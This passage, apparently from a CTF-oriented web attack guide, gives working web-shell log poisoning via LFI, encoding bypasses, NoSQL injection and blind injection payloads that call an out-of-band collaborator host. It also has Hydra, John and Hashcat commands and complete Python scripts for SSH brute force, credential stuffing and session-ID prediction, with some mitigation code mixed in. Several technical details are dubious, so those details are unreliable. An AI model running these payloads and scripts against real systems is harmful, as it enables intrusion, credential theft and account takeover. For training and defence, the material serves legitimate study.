ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Access log will contain:
# Failed password for <?php system($_GET["cmd"]); ?> from attacker_ip

# Then trigger execution via LFI
curl http://target.com/page.php?file=/var/log/auth.log&cmd=id

# Apache access log poisoning
curl -A '<?php system($_GET["cmd"]); ?>' http://target.com/

# Access via LFI
curl http://target.com/page.php?file=/var/log/apache2/access.log&cmd=id

# Mail log poisoning (if mail server available)
telnet target.com 25
MAIL FROM: attacker@attacker.com
RCPT TO: <?php system($_GET["cmd"]); ?>@target.com
```

**Null Byte Injection (Legacy)**

```bash
# Old PHP versions (<5.3.4)
# Bypass extension checks
page.php?file=shell.php%00.txt
upload.php?name=shell.php%00.jpg

# In URLs
http://target.com/download.php?file=../../../../etc/passwd%00

# [Unverified] This technique is largely patched in modern systems
```

**Encoding Bypass Techniques**

```bash
# URL encoding
%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E

# Double URL encoding
%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E

# Unicode encoding
\u003C\u003Fphp system($_GET['cmd']); \u003F\u003E

# HTML entity encoding
&lt;?php system($_GET['cmd']); ?&gt;

# Base64 encoding (then decode server-side)
PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# Hex encoding
\x3c\x3f\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x20\x3f\x3e
```

**Expression Injection in NoSQL**

```javascript
# MongoDB injection for code execution
# Vulnerable query
db.users.find({username: userInput, password: passInput})

# Injection payload
username[$ne]=1&password[$ne]=1

# JavaScript injection (where operator)
{"$where": "function() { return true; }"}

# Code execution via $where
{"$where": "sleep(5000)"}
{"$where": "this.username == 'admin' || true"}

# Server-side JavaScript injection
username=admin'||'1'=='1&password=anything
```

**MongoDB NoSQL Injection to RCE**

[Unverified] Requires specific MongoDB configurations and versions:

```javascript
# Using $function (MongoDB 4.4+)
{
  "$function": {
    "body": "function() { return execute('id'); }",
    "args": [],
    "lang": "js"
  }
}

# mapReduce with code execution
db.collection.mapReduce(
  function() { emit(1, execute('id')); },
  function(key, values) { return Array.sum(values); },
  { out: "results" }
)
```

**Testing Checklist for Injection Vulnerabilities**

```bash
# Systematic injection testing approach:

1. Command Injection
   - Test all input fields with: ; id, | id, && id
   - Check file upload filenames
   - Test HTTP headers (User-Agent, Referer)

2. LDAP Injection
   - Test authentication forms with: *, *)(&, *)(|
   - Enumerate with wildcard patterns

3. XML/XPath Injection
   - Upload XML files with XXE payloads
   - Test XPath queries with: ' or '1'='1
   - Check XML parsing in API endpoints

4. Template Injection
   - Test {{7*7}}, ${7*7}, <%= 7*7 %>
   - Check for reflected input in responses
   - Test file upload with template extensions

5. EL Injection
   - Java apps: ${}, #{}
   - Look for Spring, JSF, Struts applications

6. Code Injection
   - Look for eval(), exec(), system() usage
   - Test serialization endpoints
   - Check for unsafe deserialization
```

**Automated Injection Testing**

```bash
# Nuclei templates for injection
nuclei -u http://target.com -t cves/ -t vulnerabilities/injection/

# SQLmap for various injections (not just SQL)
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Commix for command injection
commix --url="http://target.com/exec?cmd=test" --batch

# Custom Burp Suite extension: Taborator
# Detects blind injections via DNS/HTTP callbacks

# Using Collaborator for blind injection detection
# Payload: ; nslookup $(whoami).burpcollaborator.net
```

**Manual Blind Injection Detection Script**

```python
import requests
import time
import dns.resolver

class BlindInjectionTester:
    def __init__(self, url, param, collaborator_domain):
        self.url = url
        self.param = param
        self.collab = collaborator_domain
        
    def test_command_injection(self):
        """Test for blind command injection"""
        payloads = [
            f"; nslookup cmd-inj.{self.collab}",
            f"| nslookup cmd-inj.{self.collab}",
            f"& nslookup cmd-inj.{self.collab}",
            f"`nslookup cmd-inj.{self.collab}`",
            f"$(nslookup cmd-inj.{self.collab})"
        ]
        
        for payload in payloads:
            requests.get(self.url, params={self.param: payload})
            time.sleep(2)
            
            # Check DNS logs for interaction
            if self.check_dns_interaction("cmd-inj"):
                print(f"[+] Command injection found: {payload}")
                return True
        
        return False
    
    def test_xxe(self):
        """Test for blind XXE"""
        xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://xxe.{self.collab}">
  %xxe;
]>
<data>&xxe;</data>"""
        
        headers = {"Content-Type": "application/xml"}
        requests.post(self.url, data=xxe_payload, headers=headers)
        time.sleep(2)
        
        if self.check_dns_interaction("xxe"):
            print("[+] XXE vulnerability found")
            return True
        
        return False
    
    def check_dns_interaction(self, subdomain):
        """Check if DNS lookup occurred"""
        # [Inference] Actual implementation would query 
        # collaborator server logs or use DNS resolver
        try:
            answers = dns.resolver.resolve(f"{subdomain}.{self.collab}", 'A')
            return len(answers) > 0
        except:
            return False

# Usage
tester = BlindInjectionTester(
    url="http://target.com/api",
    param="input",
    collaborator_domain="attacker.burpcollaborator.net"
)

tester.test_command_injection()
tester.test_xxe()
```

**Remediation Verification**

```python
# Test if injection is properly fixed
def verify_remediation(url, param):
    """Test various bypass techniques after fix"""
    
    bypasses = [
        # Basic
        "; id",
        # Encoded
        "%3B%20id",
        # Double encoded
        "%253B%2520id",
        # Unicode
        "\u003B id",
        # Null byte
        "; id%00",
        # Newline
        "%0a id",
        # With comments
        ";/**/id",
        # Case variation
        "; ID",
        # Concatenation
        "';'id",
    ]
    
    for bypass in bypasses:
        response = requests.get(url, params={param: bypass})
        if "uid=" in response.text or "root" in response.text:
            print(f"[!] Still vulnerable to: {bypass}")
            return False
    
    print("[+] No injection vulnerabilities detected")
    return True
```

### Related Topics for Further Study

- SQL Injection (SQLi) and advanced techniques
- NoSQL injection beyond MongoDB
- CRLF injection and HTTP response splitting
- HTML injection and Cross-Site Scripting (XSS)
- CSV injection and formula injection

---

## Authentication & Session Management

### Brute Force Attacks

Brute force attacks systematically attempt all possible password combinations or credentials to gain unauthorized access. These attacks exploit weak password policies, insufficient rate limiting, or inadequate account lockout mechanisms.

#### Hydra Setup and Configuration

Hydra is a parallelized login cracker supporting numerous protocols. Install on Kali Linux:

```bash
apt-get install hydra hydra-gtk
hydra -h  # Display help and supported modules
```

Hydra supports: SSH, FTP, Telnet, HTTP, HTTPS, LDAP, SMTP, POP3, IMAP, MySQL, PostgreSQL, Oracle, VNC, Redis, MongoDB, and many others.

#### SSH Brute Force with Hydra

Basic SSH attack against a single target:

```bash
hydra -l username -p password ssh://target_ip
```

Parameters: `-l` specifies single username, `-p` specifies single password to test.

Test multiple usernames and passwords:

```bash
hydra -L usernames.txt -P passwords.txt ssh://target_ip
```

Parameters: `-L` specifies username file, `-P` specifies password file.

Optimize for speed using parallel connections:

```bash
hydra -L usernames.txt -P passwords.txt -t 16 ssh://target_ip
```

The `-t` parameter sets number of parallel threads (default 16). Increase for faster testing but risk overwhelming network or triggering rate limiting.

Attempt specific port and SSH version targeting:

```bash
hydra -L usernames.txt -P passwords.txt -s 2222 ssh://target_ip
```

The `-s` flag specifies non-standard port (SSH default is 22).

Continue after finding first valid credential:

```bash
hydra -L usernames.txt -P passwords.txt -f ssh://target_ip
```

The `-f` flag stops after finding first successful credential pair.

Verbose output for debugging:

```bash
hydra -L usernames.txt -P passwords.txt -v -V ssh://target_ip
```

The `-v` flag shows attempt details, `-V` shows more verbose output including server responses.

Save results to file:

```bash
hydra -L usernames.txt -P passwords.txt -o results.txt ssh://target_ip
```

The `-o` parameter writes successful credentials to specified file.

#### HTTP(S) Brute Force with Hydra

Attack HTTP basic authentication:

```bash
hydra -L usernames.txt -P passwords.txt -F http-get://target_ip/protected/
```

The `http-get` module attempts credentials using HTTP GET with basic authentication header.

Attack HTTP POST login forms:

```bash
hydra -L usernames.txt -P passwords.txt http-post-form://target_ip:80/login.php:"username=^USER^&password=^PASS^":"login failed"
```

Parameters breakdown:

- `^USER^`: placeholder for username from wordlist
- `^PASS^`: placeholder for password from wordlist
- `"login failed"`: failure indicator string (attempt is unsuccessful if response contains this string)

Advanced HTTP POST with session cookies:

```bash
hydra -L usernames.txt -P passwords.txt http-post-form://target_ip/login.php:"user=^USER^&pass=^PASS^&csrf=CSRF_TOKEN":"incorrect"
```

For dynamic CSRF tokens, use pre-request script or modify attack:

```bash
hydra -L usernames.txt -P passwords.txt http-post-form://target_ip/login.php:"username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=value:F=Login failed"
```

Parameters:

- `H=`: Add custom HTTP header
- `F=`: Failure string (attempt fails if response does NOT contain this string)

Attack HTTP digest authentication:

```bash
hydra -L usernames.txt -P passwords.txt http-head://target_ip/
```

The `http-head` module uses HTTP HEAD requests with digest authentication.

#### FTP Brute Force with Hydra

Basic FTP attack:

```bash
hydra -L usernames.txt -P passwords.txt ftp://target_ip
```

Specify non-standard FTP port:

```bash
hydra -L usernames.txt -P passwords.txt -s 2121 ftp://target_ip
```

#### Database Brute Force with Hydra

MySQL attack:

```bash
hydra -L usernames.txt -P passwords.txt mysql://target_ip
```

PostgreSQL attack:

```bash
hydra -L usernames.txt -P passwords.txt postgres://target_ip
```

Oracle database attack:

```bash
hydra -L usernames.txt -P passwords.txt oracle-listener://target_ip
```

#### Wordlist Generation for Brute Force

Create targeted username list:

```bash
# Common usernames
echo -e "admin\nroot\ntest\nuser\noperator" > usernames.txt

# Extract usernames from external data
cat emails.txt | cut -d@ -f1 > usernames_extracted.txt
```

Generate password list using crunch:

```bash
# Generate all 3-character lowercase passwords
crunch 3 3 abcdefghijklmnopqrstuvwxyz -o passwords.txt

# Generate passwords with pattern (digits only, 4 characters)
crunch 4 4 0123456789 -o pins.txt

# Generate passwords matching pattern (first char uppercase, rest lowercase, numbers)
crunch 8 8 -t A@@@@@!! -o pattern_passwords.txt
```

Pattern symbols: `@` = lowercase, `,` = uppercase, `%` = numeric, `!` = special character.

Use common wordlists from Kali:

```bash
ls /usr/share/wordlists/
# Common lists: rockyou.txt, metasploit/passwords.txt

# Decompress rockyou.txt if needed
gunzip /usr/share/wordlists/rockyou.txt.gz

# Use subset of wordlist
head -1000 /usr/share/wordlists/rockyou.txt > subset_passwords.txt
```

#### Custom Brute Force Script (Python)

```python
#!/usr/bin/env python3
import sys
import socket
import paramiko
from concurrent.futures import ThreadPoolExecutor, as_completed

def ssh_login(host, port, username, password):
    """Attempt SSH login and return success status"""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port=port, username=username, password=password, timeout=5)
        ssh.close()
        return True, username, password
    except (paramiko.AuthenticationException, socket.timeout, paramiko.SSHException):
        return False, username, password
    except Exception as e:
        print(f"Error: {e}")
        return False, username, password

def brute_force_ssh(host, port, usernames_file, passwords_file, threads=16):
    """Brute force SSH with parallelization"""
    with open(usernames_file, 'r') as f:
        usernames = [line.strip() for line in f if line.strip()]
    
    with open(passwords_file, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    print(f"[*] Starting brute force: {len(usernames)} users, {len(passwords)} passwords")
    print(f"[*] Total attempts: {len(usernames) * len(passwords)}")
    
    found_credentials = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        
        for username in usernames:
            for password in passwords:
                future = executor.submit(ssh_login, host, port, username, password)
                futures.append(future)
        
        completed = 0
        for future in as_completed(futures):
            completed += 1
            if completed % 100 == 0:
                print(f"[*] Attempts: {completed}/{len(usernames) * len(passwords)}")
            
            success, username, password = future.result()
            if success:
                print(f"[+] FOUND: {username}:{password}")
                found_credentials.append((username, password))
    
    return found_credentials

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <host> <usernames_file> <passwords_file> [port] [threads]")
        sys.exit(1)
    
    host = sys.argv[1]
    usernames_file = sys.argv[2]
    passwords_file = sys.argv[3]
    port = int(sys.argv[4]) if len(sys.argv) > 4 else 22
    threads = int(sys.argv[5]) if len(sys.argv) > 5 else 16
    
    credentials = brute_force_ssh(host, port, usernames_file, passwords_file, threads)
    
    if credentials:
        print(f"\n[+] Successfully found {len(credentials)} credential(s)")
        for username, password in credentials:
            print(f"    {username}:{password}")
    else:
        print("\n[-] No valid credentials found")
```

Run custom brute force script:

```bash
python3 brute_force.py 192.168.1.100 usernames.txt passwords.txt 22 16
```

### Dictionary Attacks

Dictionary attacks use pre-compiled lists of common passwords, words, and variations to crack credentials more efficiently than exhaustive brute force. These attacks exploit password patterns and common choices.

#### Dictionary Attack Fundamentals

Effectiveness depends on wordlist quality and password variation techniques (mutation rules). Modern dictionary attacks combine common passwords with transformation rules.

#### John the Ripper Dictionary Attack

Install John the Ripper:

```bash
apt-get install john
john --version
```

Crack password hash using wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Crack specific hash format:

```bash
john --format=SHA-512 --wordlist=passwords.txt hashes.txt
```

Apply mutation rules to wordlist:

```bash
john --wordlist=passwords.txt --rules=Jumbo hashes.txt
```

The `Jumbo` rule set applies transformations: adding numbers, special characters, case variations, etc.

Custom rule definition in `john.conf`:

```ini
[List.Rules:CustomRules]
d                    # Duplicate
c                    # Capitalize
$1 $2 $3             # Append "123"
$! $@ $#             # Append "!@#"
```

Apply custom rules:

```bash
john --wordlist=passwords.txt --rules=CustomRules hashes.txt
```

Incremental mode (generates all character combinations):

```bash
john --incremental=LowerCase hashes.txt
```

Character sets for incremental mode:

- `LowerCase`: a-z
- `UpperCase`: A-Z
- `Digits`: 0-9
- `Alpha`: a-zA-Z
- `Alnum`: a-zA-Z0-9
- `All`: includes special characters

Hybrid attack combining wordlist and incremental:

```bash
john --wordlist=passwords.txt --rules --incremental=All hashes.txt
```

#### Hashcat Dictionary Attack

Install Hashcat:

```bash
apt-get install hashcat
hashcat --version
hashcat --help | grep -i wordlist
```

Basic dictionary attack:

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Parameters:

- `-m 1000`: NTLM hash format
- `-a 0`: Dictionary attack (straight mode)
- hashes.txt: Target hash file
- wordlist.txt: Dictionary file

Apply rules during attack:

```bash
hashcat -m 1000 -a 0 hashes.txt passwords.txt -r /usr/share/hashcat/rules/best64.rule
```

The `-r` parameter specifies rule file. Hashcat includes pre-built rule sets:

- `best64.rule`: Top 64 most effective rules
- `OneRule.rule`: One rule per password
- `dive.rule`: Aggressive rules

Combination attack (multiple wordlists):

```bash
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt
```

Parameter `-a 1` combines wordlists (concatenation).

Mask attack (pattern-based):

```bash
hashcat -m 1000 -a 3 hashes.txt "password?d?d?d"
```

Mask patterns:

- `?l`: lowercase letter
- `?u`: uppercase letter
- `?d`: digit
- `?s`: special character
- `?a`: all characters above

Resume interrupted session:

```bash
hashcat -m 1000 -a 0 hashes.txt passwords.txt --restore
```

GPU acceleration (if available):

```bash
hashcat -m 1000 -a 0 hashes.txt passwords.txt -d 1
```

The `-d` parameter specifies device (1=CPU, 2=GPU).

#### Optimizing Dictionary Attacks

Sort wordlist by frequency to test most likely passwords first:

```bash
# Count word frequency in wordlist
cat rockyou.txt | sort | uniq -c | sort -rn | head -100 > top_100_passwords.txt

# Use frequency-sorted wordlist
john --wordlist=top_100_passwords.txt hashes.txt
```

Create domain-specific dictionaries:

```bash
# Extract words from website
wget -q https://target.com -O - | tr ' ' '\n' | sort -u > domain_words.txt

# Generate variations combining domain words with numbers
for word in $(cat domain_words.txt); do
    echo "$word"
    echo "${word}1"
    echo "${word}123"
    echo "${word}2024"
done > custom_dictionary.txt
```

#### Custom Dictionary Generation Script

```python
#!/usr/bin/env python3
import sys
import itertools

def generate_mutations(word):
    """Generate common password mutations"""
    mutations = [word]
    
    # Case variations
    mutations.append(word.capitalize())
    mutations.append(word.upper())
    
    # Number appends
    for i in range(100):
        mutations.append(f"{word}{i}")
    mutations.append(f"{word}123")
    mutations.append(f"{word}2024")
    
    # Special character appends
    for char in "!@#$%^&*":
        mutations.append(f"{word}{char}")
    
    # Leet speak variations
    leet_map = {
        'a': '4', 'e': '3', 'i': '1', 'o': '0',
        's': '$', 't': '7', 'b': '8', 'l': '1'
    }
    leet_word = word
    for old, new in leet_map.items():
        leet_word = leet_word.replace(old, new)
    mutations.append(leet_word)
    
    return mutations

def generate_combinations(words):
    """Generate word combinations"""
    combinations = []
    
    # Single words
    for word in words:
        combinations.extend(generate_mutations(word))
    
    # Two-word combinations
    for w1, w2 in itertools.combinations(words, 2):
        combinations.append(f"{w1}{w2}")
        combinations.append(f"{w1}_{w2}")
        combinations.append(f"{w1}-{w2}")
    
    return list(set(combinations))  # Remove duplicates

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <input_wordlist> [output_file]")
        sys.exit(1)
    
    with open(sys.argv[1], 'r') as f:
        input_words = [line.strip() for line in f if line.strip()]
    
    mutations = generate_combinations(input_words)
    mutations = sorted(set(mutations), key=len)
    
    output = sys.argv[2] if len(sys.argv) > 2 else "mutations.txt"
    with open(output, 'w') as f:
        for mutation in mutations:
            f.write(f"{mutation}\n")
    
    print(f"[+] Generated {len(mutations)} mutations")
    print(f"[+] Saved to {output}")
```

### Credential Stuffing

Credential stuffing attacks use credentials leaked from other breached services to attempt unauthorized access. This exploits password reuse across multiple services.

#### Credential Stuffing Methodology

Obtain leaked credentials from public breaches:

```bash
# Query Have I Been Pwned API
curl "https://haveibeenpwned.com/api/v3/breachedaccount/test@example.com" \
  -H "User-Agent: CTF-Research"
```

[Unverified] The Have I Been Pwned API rate-limits requests and requires authentication for high-volume queries. Check API documentation for current usage policies.

Compile consolidated credential lists from multiple sources:

```bash
cat breach1.txt breach2.txt breach3.txt | sort -u > consolidated_credentials.txt
```

Parse various breach formats:

```bash
# Email:password format
grep -E '^[^:]+@[^:]+:[^:]+$' breach.txt > parsed_emails.txt

# Username:password format
awk -F: '{print $1":"$2}' breach.txt > parsed_usernames.txt

# Remove duplicate usernames (keep first occurrence)
sort -t: -k1,1 -u breach.txt > unique_usernames.txt
```

#### Credential Stuffing Attack Script

```python
#!/usr/bin/env python3
import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

def test_credentials(session, target_url, username, password, method="post"):
    """Test single credential pair against target"""
    try:
        if method.lower() == "post":
            data = {
                "username": username,
                "password": password,
                "login": "Login"
            }
            response = session.post(target_url, data=data, timeout=10)
        else:
            response = session.get(target_url, auth=(username, password), timeout=10)
        
        # Check for success indicators
        success_indicators = ["dashboard", "welcome", "redirect", "302", "authenticated"]
        error_indicators = ["invalid", "failed", "error", "401", "403"]
        
        if any(indicator in response.text.lower() for indicator in success_indicators):
            if not any(indicator in response.text.lower() for indicator in error_indicators):
                return True, username, password
        
        if response.status_code == 302:  # Redirect typically indicates success
            return True, username, password
        
        return False, username, password
    
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        return False, username, password

def credential_stuffing(target_url, credentials_file, threads=10, method="post"):
    """Execute credential stuffing attack"""
    
    # Parse credentials
    credentials = []
    with open(credentials_file, 'r') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                credentials.append((parts[0], parts[1]))
    
    print(f"[*] Loaded {len(credentials)} credential pairs")
    print(f"[*] Target: {target_url}")
    print(f"[*] Threads: {threads}")
    
    found_credentials = []
    session = requests.Session()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        
        for username, password in credentials:
            future = executor.submit(test_credentials, session, target_url, 
                                    username, password, method)
            futures.append((username, password, future))
        
        completed = 0
        for username, password, future in futures:
            completed += 1
            if completed % 50 == 0:
                print(f"[*] Tested {completed}/{len(credentials)}")
            
            try:
                success, user, pwd = future.result()
                if success:
                    print(f"[+] FOUND: {user}:{pwd}")
                    found_credentials.append((user, pwd))
            except Exception as e:
                print(f"[-] Error processing {username}: {e}")
    
    return found_credentials

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <target_url> <credentials_file> [threads] [method]")
        print(f"Example: {sys.argv[0]} http://target.com/login.php creds.txt 10 post")
        sys.exit(1)
    
    target_url = sys.argv[1]
    credentials_file = sys.argv[2]
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 10
    method = sys.argv[4] if len(sys.argv) > 4 else "post"
    
    found = credential_stuffing(target_url, credentials_file, threads, method)
    
    print(f"\n[+] Successfully found {len(found)} valid credential pair(s)")
```

Run credential stuffing attack:

```bash
python3 credential_stuffing.py http://target.com/login.php credentials.txt 10 post
```

#### Mitigations and Detection

Implement rate limiting:

```python
# Flask rate limiting example
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5/minute")  # 5 attempts per minute per IP
def login():
    # Login logic
    pass
```

Implement progressive delays and CAPTCHA:

```python
@app.route('/login', methods=['POST'])
def login():
    failed_attempts = session.get('failed_attempts', 0)
    
    if failed_attempts > 3:
        # Require CAPTCHA after 3 failed attempts
        verify_captcha(request.form.get('captcha'))
    
    if failed_attempts > 10:
        # Increase delay exponentially
        time.sleep(2 ** failed_attempts)
    
    # Authentication logic
```

Monitor for credential stuffing patterns:

```python
# Log and analyze failed authentication attempts
def log_auth_attempt(username, source_ip, success):
    db.log_auth_attempt(username, source_ip, success, datetime.now())
    
    # Check for suspicious patterns
    attempts_5min = db.count_attempts_since(source_ip, minutes=5)
    if attempts_5min > 50:
        alert_security_team(f"Potential credential stuffing: {source_ip}")
```

### Session Fixation

Session fixation attacks force a user to use a known session identifier, allowing the attacker to impersonate the user after authentication.

#### Session Fixation Vulnerability

Vulnerable application flow:

```python
# VULNERABLE: Session ID not regenerated after login
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if verify_credentials(username, password):
        # Session ID remains the same before and after login
        session['user_id'] = get_user_id(username)
        session['authenticated'] = True
        return redirect('/dashboard')
```

Attacker exploits vulnerability:

1. Attacker accesses application and receives session ID (e.g., `sess_12345`)
2. Attacker sends victim a crafted link containing this session ID
3. Victim clicks link and logs in using their credentials
4. Session ID remains unchanged; attacker can use the known session ID to access victim's account

#### Exploitation Techniques

Force victim to use attacker-controlled session:

```html
<!-- Malicious HTML sent to victim -->
<img src="http://target.com/login?PHPSESSID=attacker_session_id" style="display:none;">
```

When victim logs in through normal login, their authentication is tied to `attacker_session_id`.

JavaScript-based session fixation:

```javascript
// Set cookie to specific value
document.cookie = "PHPSESSID=attacker_session_id; path=/";

// Redirect to login page
window.location = "http://target.com/login";
```

PHP-based session fixation attack:

```php
<?php
// Attacker forces victim to use specific session ID
session_id('attacker_controlled_id');
session_start();

// When victim authenticates, their session is logged with attacker's ID
?>
```

#### Session Fixation with URL Rewriting

Some applications use URL parameters for session tracking:

```
http://target.com/?SESSIONID=attacker_session_id&user=victim
```

Attacker sends victim this URL; after login, attacker accesses `/dashboard?SESSIONID=attacker_session_id`.

#### Detection and Prevention

Regenerate session ID after authentication:

```python
# SECURE: Regenerate session ID after login
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if verify_credentials(username, password):
        # Invalidate old session
        session.clear()
        
        # Regenerate session ID
        session.regenerate(prefix='auth_')
        
        session['user_id'] = get_user_id(username)
        session['authenticated'] = True
        return redirect('/dashboard')
```

Validate session origin:

```python
@app.before_request
def validate_session():
    if 'authenticated' in session:
        # Verify session originated from expected source
        stored_ip = session.get('origin_ip')
        current_ip = request.remote_addr
        
        if stored_ip and stored_ip != current_ip:
            # Potential session hijacking; invalidate session
            session.clear()
            abort(401)
```

Use secure session configuration:

```python
# Django secure session settings
SESSION_COOKIE_SECURE = True       # HTTPS only
SESSION_COOKIE_HTTPONLY = True     # JavaScript cannot access
SESSION_COOKIE_SAMESITE = 'Strict' # CSRF protection
SESSION_EXPIRE_AT_BROWSER_CLOSE = True
SESSION_COOKIE_AGE = 1800          # 30 minutes
```

Bind session to user agent and IP address:

```python
@app.route('/login', methods=['POST'])
def login():
    if verify_credentials(username, password):
        session.regenerate()
        session['user_id'] = get_user_id(username)
        session['user_agent'] = request.headers.get('User-Agent')
        session['ip_address'] = request.remote_addr
        return redirect('/dashboard')

@app.before_request
def validate_session_binding():
    if 'user_id' in session:
        if session.get('user_agent') != request.headers.get('User-Agent'):
            session.clear()
            abort(401)
        if session.get('ip_address') != request.remote_addr:
            session.clear()
            abort(401)
```

Implement CSRF tokens to prevent session fixation via link injection:

```html
<!-- Login form includes CSRF token -->
<form method="post" action="/login">
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
    <input type="text" name="username">
    <input type="password" name="password">
    <input type="submit" value="Login">
</form>
```

Validate CSRF token on server:

```python
@app.route('/login', methods=['POST'])
def login():
    token = request.form.get('csrf_token')
    if not validate_csrf_token(token):
        abort(403)
    
    # Continue with authentication
```

#### Session Fixation Testing in CTF

Identify session management mechanisms:

```bash
# Check for session cookie
curl -i http://target.com/ | grep -i set-cookie

# Analyze cookie attributes
curl -i http://target.com/ | grep -i "secure\|httponly\|samesite"
```

Manually test session fixation:

1. Access application without logging in, record session ID
2. Use session ID in crafted login request
3. Verify session ID unchanged after authentication
4. Attempt to access authenticated resources with original session ID

[Inference] Successful session fixation typically allows attacker-controlled session ID to persist through login, enabling unauthorized access to victim's account using the pre-established session identifier.

Test with automation:

```python
import requests

def test_session_fixation(target_url, login_endpoint, credentials):
    session = requests.Session()
    
    # Get initial session cookie
    r1 = session.get(target_url)
    initial_cookie = session.cookies.get_dict()
    print(f"[*] Initial session: {initial_cookie}")
    
    # Attempt login
    r2 = session.post(login_endpoint, data=credentials)
    post_auth_cookie = session.cookies.get_dict()
    print(f"[*] Post-auth session: {post_auth_cookie}")
    
    # Compare session IDs
    if initial_cookie == post_auth_cookie:
        print("[!] VULNERABLE: Session ID not regenerated")
        return True
    else:
        print("[+] SECURE: Session ID regenerated after login")
        return False
```

### Session Prediction

Session prediction exploits weak session ID generation to hijack user sessions.

**Session ID Entropy Analysis**

```python
#!/usr/bin/env python3
import math
import requests
from collections import Counter

def analyze_session_entropy(session_ids):
    """
    Calculate entropy of session ID generation
    """
    # Convert to numeric representations
    numeric_values = []
    for sid in session_ids:
        try:
            # Try to interpret as hex
            numeric_values.append(int(sid, 16))
        except ValueError:
            # Try to interpret as base64 or other encoding
            numeric_values.append(hash(sid))
    
    # Calculate entropy
    counter = Counter(numeric_values)
    total = len(numeric_values)
    entropy = -sum((count/total) * math.log2(count/total) 
                   for count in counter.values())
    
    print(f"[*] Total sessions analyzed: {total}")
    print(f"[*] Unique sessions: {len(counter)}")
    print(f"[*] Entropy: {entropy:.4f} bits")
    print(f"[*] Theoretical max entropy: {math.log2(total):.4f} bits")
    
    # Check for sequential patterns
    if len(numeric_values) > 1:
        differences = [numeric_values[i+1] - numeric_values[i] 
                      for i in range(len(numeric_values)-1)]
        avg_diff = sum(differences) / len(differences)
        print(f"[*] Average difference: {avg_diff:.2f}")
        
        if abs(avg_diff) < 1000:
            print("[!] WARNING: Sequential pattern detected")
    
    return entropy

def collect_session_ids(url, count=100):
    """
    Collect multiple session IDs for analysis
    """
    session_ids = []
    
    for i in range(count):
        response = requests.get(url)
        
        # Extract session from cookie
        if 'Set-Cookie' in response.headers:
            cookie = response.headers['Set-Cookie']
            # Parse session ID from cookie
            for part in cookie.split(';'):
                if 'session' in part.lower() or 'sessid' in part.lower():
                    sid = part.split('=')[1].strip()
                    session_ids.append(sid)
                    break
        
        if i % 10 == 0:
            print(f"[*] Collected {i}/{count} sessions")
    
    return session_ids

# Example usage
# session_ids = collect_session_ids("http://target.com/login", 100)
# analyze_session_entropy(session_ids)
```

**Timestamp-Based Session Prediction**

```python
#!/usr/bin/env python3
import time
import hashlib
import hmac

def predict_timestamp_sessions(known_sessions):
    """
    Predict session IDs based on timestamp patterns
    """
    # Common timestamp-based session patterns
    predictions = []
    
    for sid in known_sessions:
        try:
            # Try to decode as timestamp
            # Common formats: Unix timestamp, MD5(timestamp), etc.
            
            # Pattern 1: MD5 of timestamp
            current_time = int(time.time())
            for offset in range(-3600, 3600):  # ±1 hour
                test_time = current_time + offset
                predicted = hashlib.md5(str(test_time).encode()).hexdigest()
                if predicted == sid:
                    print(f"[+] Found timestamp pattern: MD5(timestamp)")
                    print(f"    Offset: {offset} seconds")
                    
                    # Generate future sessions
                    for i in range(1, 11):
                        future_time = current_time + i
                        future_sid = hashlib.md5(str(future_time).encode()).hexdigest()
                        predictions.append(future_sid)
                    return predictions
            
            # Pattern 2: SHA1 of timestamp
            for offset in range(-3600, 3600):
                test_time = current_time + offset
                predicted = hashlib.sha1(str(test_time).encode()).hexdigest()
                if predicted == sid:
                    print(f"[+] Found timestamp pattern: SHA1(timestamp)")
                    for i in range(1, 11):
                        future_time = current_time + i
                        future_sid = hashlib.sha1(str(future_time).encode()).hexdigest()
                        predictions.append(future_sid)
                    return predictions
            
            # Pattern 3: Base64 encoded timestamp
            import base64
            try:
                decoded = base64.b64decode(sid)
                if decoded.isdigit():
                    print(f"[+] Found timestamp pattern: Base64(timestamp)")
                    base_time = int(decoded)
                    for i in range(1, 11):
                        future_time = base_time + i
                        future_sid = base64.b64encode(str(future_time).encode()).decode()
                        predictions.append(future_sid)
                    return predictions
            except:
                pass
                
        except Exception as e:
            continue
    
    return predictions

# Example usage
known_sessions = ["098f6bcd4621d373cade4e832627b4f6"]  # MD5 of "test"
predicted = predict_timestamp_sessions(known_sessions)
```

**Sequential Session ID Exploitation**

```python
#!/usr/bin/env python3
import requests

def exploit_sequential_sessions(base_url, known_session):
    """
    Exploit sequential session IDs
    """
